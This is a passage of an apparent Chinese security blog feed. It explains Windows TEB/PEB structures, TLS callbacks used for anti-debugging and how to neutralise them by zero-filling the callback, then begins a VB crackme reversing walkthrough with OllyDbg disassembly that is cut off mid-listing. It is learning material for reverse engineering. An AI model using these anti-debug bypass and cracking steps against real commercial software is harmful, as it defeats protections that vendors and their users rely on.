class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">typedef struct _KPCR_TIB </div><div class="line">&#123;  </div><div class="line">PVOID  ExceptionList;   //重点              </div><div class="line">PVOID  StackBase;                 </div><div class="line">PVOID  StackLimit;                 </div><div class="line">PVOID  SubSystemTib;              </div><div class="line">_ANONYMOUS_UNION union </div><div class="line">&#123;  </div><div class="line">   PVOID  FiberData;             </div><div class="line">   DWORD  Version;            </div><div class="line">&#125;DUMMYUNIONNAME;  </div><div class="line">PVOID  ArbitraryUserPointer;       </div><div class="line">struct _NT_TIB *Self;  //重点             </div><div class="line">&#125; KPCR_TIB, *PKPCR_TIB;</div></pre></td></tr></table></figure></li><li><p>ExceptionList用于指向EXCEPTION_REGISTRATION_RECORD结构体链表（指向SEH）</p></li><li>self成员是TIB的自用指针，指向TIB的第一个成员，也是TEB的第一个成员。</li></ul></li><li><h3 id="TEB的访问方法："><a href="#TEB的访问方法：" class="headerlink" title="TEB的访问方法："></a>TEB的访问方法：</h3></li><li>FS:[0X00]=SEH的起始地址</li><li>FS:[0x18]=TEB的起始地址</li><li>FS:[0x30]=PEB的起始地址</li></ul><h2 id="进程环境块（PEB）："><a href="#进程环境块（PEB）：" class="headerlink" title="进程环境块（PEB）："></a>进程环境块（PEB）：</h2><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PEB（Process Environment Block，进程环境块）存放进程信息，每个进程都有自己的PEB信息。位于用户地址空间。在Win 2000下，进程环境块的地址对于每个进程来说是固定的，在0x7FFDF000处，这是用户地址空间，所以程序能够直接访问。准确的PEB地址应从系统 的EPROCESS结构的0x1b0偏移处获得，但由于EPROCESS在系统地址空间，访问这个结构需要有ring0的权限。还可以通过TEB结构的偏 移0x30处获得PEB的位置，FS段寄存器指向当前的TEB结构.</strong></p><h3 id="PEB的信息如下："><a href="#PEB的信息如下：" class="headerlink" title="PEB的信息如下："></a>PEB的信息如下：</h3><figure class="highlight plain"><figcaption><span>_PEB结构：</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">typedef struct _PEB </div><div class="line">&#123; </div><div class="line"> UCHAR InheritedAddressSpace;   /*000*/</div><div class="line">UCHAR ReadImageFileExecOptions;/*001*/ </div><div class="line">UCHAR BeingDebugged;           /*002*/ //程序是否处于调试状态</div><div class="line">UCHAR SpareBool;               /*003*/ // Allocation size</div><div class="line"> HANDLE Mutant;                 /*004*/</div><div class="line">HINSTANCE ImageBaseAddress;    /*008*/ //进程映像基地址 </div><div class="line"> VOID *DllList;                 /*00C*/ //加载的其他模块信息</div><div class="line"> PPROCESS_PARAMETERS *ProcessParameters;  /*010*/</div><div class="line"> ULONG SubSystemData;           /*014*/</div><div class="line">HANDLE DefaultHeap;            /*018*/ </div><div class="line">KSPIN_LOCK FastPebLock;        /*01C*/ </div><div class="line"> ULONG FastPebLockRoutine;      /*020*/</div><div class="line">ULONG FastPebUnlockRoutine;    /*024*/ </div><div class="line"> ULONG EnvironmentUpdateCount;  /*028*/</div><div class="line"> ULONG KernelCallbackTable;     /*02C*/</div><div class="line"> LARGE_INTEGER SystemReserved;  /*030*/</div><div class="line">ULONG FreeList;                /*038*/ </div><div class="line"> ULONG TlsExpansionCounter;     /*03C*/  //TSL索引计数</div><div class="line">ULONG TlsBitmap;               /*040*/  //TSL位图指针</div><div class="line">LARGE_INTEGER TlsBitmapBits;   /*044*/  //TSL进程标志位</div><div class="line">ULONG ReadOnlySharedMemoryBase;/*04C*/ </div><div class="line">ULONG ReadOnlySharedMemoryHeap;/*050*/ </div><div class="line"> ULONG ReadOnlyStaticServerData;/*054*/</div><div class="line">ULONG AnsiCodePageData;        /*058*/ </div><div class="line">ULONG OemCodePageData;         /*05C*/ </div><div class="line">ULONG UnicodeCaseTableData;    /*060*/ </div><div class="line">ULONG NumberOfProcessors;      /*064*/ </div><div class="line">LARGE_INTEGER NtGlobalFlag;    /*068*/ // Address of a local copy</div><div class="line">LARGE_INTEGER CriticalSectionTimeout;/*070*/ </div><div class="line"> ULONG HeapSegmentReserve;      /*078*/</div><div class="line"> ULONG HeapSegmentCommit;       /*07C*/</div><div class="line"> ULONG HeapDeCommitTotalFreeThreshold;/*080*/</div><div class="line">ULONG HeapDeCommitFreeBlockThreshold;/*084*/ </div><div class="line">ULONG NumberOfHeaps;           /*088*/ </div><div class="line"> ULONG MaximumNumberOfHeaps;    /*08C*/</div><div class="line"> ULONG ProcessHeaps;            /*090*/</div><div class="line">ULONG GdiSharedHandleTable;    /*094*/ </div><div class="line">ULONG ProcessStarterHelper;    /*098*/ </div><div class="line">ULONG GdiDCAttributeList;      /*09C*/ </div><div class="line">KSPIN_LOCK LoaderLock;         /*0A0*/ </div><div class="line">ULONG OSMajorVersion;          /*0A4*/ </div><div class="line"> ULONG OSMinorVersion;          /*0A8*/</div><div class="line">USHORT OSBuildNumber;          /*0AC*/ </div><div class="line">USHORT OSCSDVersion;           /*0AE*/ </div><div class="line"> ULONG OSPlatformId;            /*0B0*/</div><div class="line">ULONG ImageSubsystem;          /*0B4*/ </div><div class="line"> ULONG ImageSubsystemMajorVersion;/*0B8*/</div><div class="line"> ULONG ImageSubsystemMinorVersion;/*0BC*/</div><div class="line">ULONG ImageProcessAffinityMask;/*0C0*/ </div><div class="line">ULONG GdiHandleBuffer[0x22];   /*0C4*/ </div><div class="line"> ULONG PostProcessInitRoutine;  /*14C*/</div><div class="line"> ULONG TlsExpansionBitmap;      /*150*/</div><div class="line">UCHAR TlsExpansionBitmapBits[0x80];/*154*/ </div><div class="line"> ULONG SessionId;               /*1D4*/</div><div class="line">&#125;PEB, *PPEB;</div></pre></td></tr></table></figure><h3 id="PEB的重要成员："><a href="#PEB的重要成员：" class="headerlink" title="PEB的重要成员："></a>PEB的重要成员：</h3><ul><li>1.PEB.BeingDebugged    //程序是否处于调试状态</li><li>2.ImageBaseAddress     //表示进程的基地址</li><li>3.PEB.Ldr              //指向PEB_LDR_DATA的指针，该结构体可以获取模块（dll）加载的基地址</li><li>4.PEB.ProcessHeap&amp;&amp;PEB.NtGlobalFlag  //用于<font color="#DC143C">反调试</font><h3 id="PEB的访问方法："><a href="#PEB的访问方法：" class="headerlink" title="PEB的访问方法："></a>PEB的访问方法：</h3></li><li>FS:[0X30]=PEB</li><li>先获得TEB的地址，在偏移0x30得到PEB</li></ul><hr><h1 id="TLS技术"><a href="#TLS技术" class="headerlink" title="TLS技术"></a>TLS技术</h1><h2 id="动态TLS技术"><a href="#动态TLS技术" class="headerlink" title="动态TLS技术"></a>动态TLS技术</h2><p>四个API函数：<br>  TLsAlloc     //获取索引<br>  TlsGetValue  //获取索引值<br>  TlsSetVaule  //设置索引值<br>  TisFree      //释放索引 </p><h2 id="静态TLS技术"><a href="#静态TLS技术" class="headerlink" title="静态TLS技术"></a>静态TLS技术</h2><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;预先将变量定义在PE文件内部，一般实验.tls节即可。通过查看TLS节区，而已看到程序是否使用TLS反调试技术</strong><br>    <img src="https://i.imgur.com/FSwCzEu.png" alt=""></p><h2 id="TSL回调函数—-反调试技术的基石"><a href="#TSL回调函数—-反调试技术的基石" class="headerlink" title="TSL回调函数—-反调试技术的基石"></a>TSL回调函数—-反调试技术的基石</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>TSL函数是指，每当创建或者终止进程的线程的时候，就会自动调用的函数，一共调用2次。有意思的是，进程创建主线程的时候也会自动的调用TSL回调函数，并且调用函数优先执行于EP代码（应该是主线程调用后，但是线程函数的尚未执行之前）。<font color="#DC143C">一点扩展利用TLS回调函数在调试器加载前执行Anti-Debug函数保护软件不被恶意修改，关键部分依旧是具体实现反调试部分的代码编写。比如传统的检测断点，检测进程，检测调试器等等。反调试技术就是利用这一特征。</font></strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果使用单纯的调试器（VS），就容易被TSL回调函数检测到，由于od的工具自动免疫了TSL的反调试机制，所以只会出现正常的状态（假的）。<br>     <img src="https://i.imgur.com/6VonLyw.png" alt=""><br>     <img src="https://i.imgur.com/7bDTcmj.png" alt=""></p><ul><li>解决反调试的方法：<ul><li>1）OD插件</li><li>2）PE或者IDA查找TSL的回调函数的入口地址和大小，然后转换成文件偏移，最后用工具00填充掉就行。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;线程局部存储技术：&quot;&gt;&lt;a href=&quot;#线程局部存储技术：&quot; class=&quot;headerlink&quot; title=&quot;线程局部存储技术：&quot;&gt;&lt;/a&gt;线程局部存储技术：&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;线程局部存储技术（Thread Local Storage）很好的解决了多线程程序设计中变量的同步问题。同时，TLS回调函数也适用于&lt;font color=&quot;#DC143C&quot;&gt;反调试技术&lt;/font&gt;。使用TSL技术，可以让进程拥有同一个全局变量，但是在不同的线程却对应着不同的值，这些变量只是对应特定的线程才是有意义的&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>VB程序调试练习</title>
    <link href="http://yoursite.com/2017/11/27/VB%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/"/>
    <id>http://yoursite.com/2017/11/27/VB程序逆向练习/</id>
    <published>2017-11-27T13:45:11.000Z</published>
    <updated>2017-11-30T09:33:47.141Z</updated>
    
    <content type="html"><![CDATA[<h1 id="例子1："><a href="#例子1：" class="headerlink" title="例子1："></a>例子1：</h1><ul><li><p>思路&amp;步骤：</p><ul><li>1）查壳</li><li>2）测试发现，这个程序错误没有提示，我们对vbaLenBstr下断，注意对这个函数下断，最好使用IDA 对这个函数进行交叉参考，不然找不到正确的函数。<a id="more"></a></li><li>3）我们找到函数后，向上看我们可以看到函数的入口点。可以断定这是一个MAIN函数。</li><li><p>4）挨个分析。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div></pre></td><td class="code"><pre><div class="line"><span class="number">00408390</span>   &gt; \<span class="number">55</span>            <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line"><span class="number">00408391</span>   .  8BEC          <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line"><span class="number">00408393</span>   .  83EC <span class="number">14</span>       <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">0x14</span></div><div class="line"><span class="number">00408396</span>   .  <span class="number">68</span> <span class="number">46164000</span>   <span class="keyword">push</span> &lt;<span class="keyword">jmp</span>.&amp;MSVBVM60.__vbaExceptHandler&gt;  <span class="comment">;  SE 处理程序安装</span></div><div class="line">0040839B   .  <span class="number">64</span>:A1 <span class="number">0000000</span>&gt;<span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>]</div><div class="line">004083A1   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">004083A2   .  <span class="number">64</span>:<span class="number">8925</span> <span class="number">00000</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">esp</span></div><div class="line">004083A9   .  81EC E8000000 <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">0xE8</span></div><div class="line">004083AF   .  <span class="number">53</span>            <span class="keyword">push</span> <span class="built_in">ebx</span></div><div class="line">004083B0   .  <span class="number">56</span>            <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line">004083B1   .  <span class="number">57</span>            <span class="keyword">push</span> <span class="built_in">edi</span></div><div class="line">004083B2   .  <span class="number">8965</span> EC       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x14</span>],<span class="built_in">esp</span></div><div class="line">004083B5   .  C745 F0 <span class="number">70114</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],VBCrack1<span class="meta">.00401170</span></div><div class="line">004083BC   .  8B75 <span class="number">08</span>       <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x8</span>]</div><div class="line">004083BF   .  8BC6          <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">esi</span></div><div class="line">004083C1   .  83E0 <span class="number">01</span>       <span class="keyword">and</span> <span class="built_in">eax</span>,<span class="number">0x1</span></div><div class="line">004083C4   .  <span class="number">8945</span> F4       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xC</span>],<span class="built_in">eax</span></div><div class="line">004083C7   .  83E6 FE       <span class="keyword">and</span> <span class="built_in">esi</span>,<span class="number">0xFFFFFFFE</span></div><div class="line">004083CA   .  <span class="number">8975</span> <span class="number">08</span>       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x8</span>],<span class="built_in">esi</span></div><div class="line">004083CD   .  33FF          <span class="keyword">xor</span> <span class="built_in">edi</span>,<span class="built_in">edi</span></div><div class="line">004083CF   .  <span class="number">897D</span> F8       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="built_in">edi</span></div><div class="line">004083D2   .  8B0E          <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</div><div class="line">004083D4   .  <span class="number">56</span>            <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line">004083D5   .  FF51 <span class="number">04</span>       <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x4</span>]</div><div class="line">004083D8   .  <span class="number">897D</span> D4       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2C</span>],<span class="built_in">edi</span></div><div class="line">004083<span class="built_in">DB</span>   .  <span class="number">897D</span> D8       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x28</span>],<span class="built_in">edi</span></div><div class="line">004083DE   .  <span class="number">897D</span> D0       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x30</span>],<span class="built_in">edi</span></div><div class="line">004083E1   .  <span class="number">897D</span> C0       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x40</span>],<span class="built_in">edi</span></div><div class="line">004083E4   .  <span class="number">897D</span> BC       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x44</span>],<span class="built_in">edi</span></div><div class="line">004083E7   .  <span class="number">897D</span> B8       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x48</span>],<span class="built_in">edi</span></div><div class="line">004083EA   .  <span class="number">897D</span> B4       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4C</span>],<span class="built_in">edi</span></div><div class="line">004083ED   .  <span class="number">897D</span> B0       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x50</span>],<span class="built_in">edi</span></div><div class="line">004083F0   .  <span class="number">897D</span> A0       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x60</span>],<span class="built_in">edi</span></div><div class="line">004083F3   .  <span class="number">897D</span> <span class="number">90</span>       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x70</span>],<span class="built_in">edi</span></div><div class="line">004083F6   .  <span class="number">897D</span> <span class="number">80</span>       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x80</span>],<span class="built_in">edi</span></div><div class="line">004083F9   .  89BD 70FFFFFF <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x90</span>],<span class="built_in">edi</span></div><div class="line">004083FF   .  89BD 60FFFFFF <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA0</span>],<span class="built_in">edi</span></div><div class="line"><span class="number">00408405</span>   .  6A <span class="number">01</span>         <span class="keyword">push</span> <span class="number">0x1</span>                                       <span class="comment">; /OnErrEvent = Goto Address</span></div><div class="line"><span class="number">00408407</span>   .  FF15 5C104000 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaOnError&gt;]   <span class="comment">; \__vbaOnError</span></div><div class="line"><span class="number">0040840D</span>   .  8B16          <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</div><div class="line">0040840F   .  <span class="number">56</span>            <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line"><span class="number">00408410</span>   .  FF92 FC020000 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x2FC</span>]</div><div class="line"><span class="number">00408416</span>   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"><span class="number">00408417</span>   .  8D45 B4       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4C</span>]</div><div class="line">0040841A   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">0040841B   .  8B1D <span class="number">60104000</span> <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaObjSet&gt;] <span class="comment">;  MSVBVM60.__vbaObjSet</span></div><div class="line"><span class="number">00408421</span>   .  FFD3          <span class="keyword">call</span> <span class="built_in">ebx</span>                                       <span class="comment">;  &lt;&amp;MSVBVM60.__vbaObjSet&gt;</span></div><div class="line"><span class="number">00408423</span>   .  8BF8          <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">eax</span></div><div class="line"><span class="number">00408425</span>   .  8B0F          <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>]</div><div class="line"><span class="number">00408427</span>   .  8D55 C0       <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x40</span>]</div><div class="line">0040842A   .  <span class="number">52</span>            <span class="keyword">push</span> <span class="built_in">edx</span></div><div class="line">0040842B   .  <span class="number">57</span>            <span class="keyword">push</span> <span class="built_in">edi</span></div><div class="line">0040842C   .  FF91 A0000000 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0xA0</span>]</div><div class="line"><span class="number">00408432</span>   .  DBE2          <span class="keyword">fclex</span>                                          <span class="comment">;  浮点错误清除异常</span></div><div class="line"><span class="number">00408434</span>   .  85C0          <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line"><span class="number">00408436</span>   .  <span class="number">7D</span> <span class="number">12</span>         <span class="keyword">jge</span> XVBCrack1.0040844A</div><div class="line"><span class="number">00408438</span>   .  <span class="number">68</span> A0000000   <span class="keyword">push</span> <span class="number">0xA0</span></div><div class="line"><span class="number">0040843D</span>   .  <span class="number">68</span> D05A4000   <span class="keyword">push</span> VBCrack1.00405AD0</div><div class="line"><span class="number">00408442</span>   .  <span class="number">57</span>            <span class="keyword">push</span> <span class="built_in">edi</span></div><div class="line"><span class="number">00408443</span>   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"><span class="number">00408444</span>   .  FF15 <span class="number">48104000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaHresultChec&gt;<span class="comment">;  MSVBVM60.__vbaHresultCheckObj</span></div><div class="line">0040844A   &gt;  8B45 C0       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x40</span>]</div><div class="line"><span class="number">0040844D</span>   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">0040844E   .  FF15 <span class="number">34104000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="number">519</span>&gt;]           <span class="comment">;  MSVBVM60.rtcTrimBstr</span></div><div class="line"><span class="number">00408454</span>   .  8BD0          <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">eax</span></div><div class="line"><span class="number">00408456</span>   .  8D4D D0       <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x30</span>]</div><div class="line"><span class="number">00408459</span>   .  FF15 3C114000 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaStrMove&gt;]   <span class="comment">;  MSVBVM60.__vbaStrMove</span></div><div class="line">0040845F   .  8D4D C0       <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x40</span>]</div><div class="line"><span class="number">00408462</span>   .  FF15 <span class="number">54114000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaFreeStr&gt;]   <span class="comment">;  MSVBVM60.__vbaFreeStr</span></div><div class="line"><span class="number">00408468</span>   .  8D4D B4       <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4C</span>]</div><div class="line">0040846B   .  FF15 <span class="number">58114000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaFreeObj&gt;]   <span class="comment">;  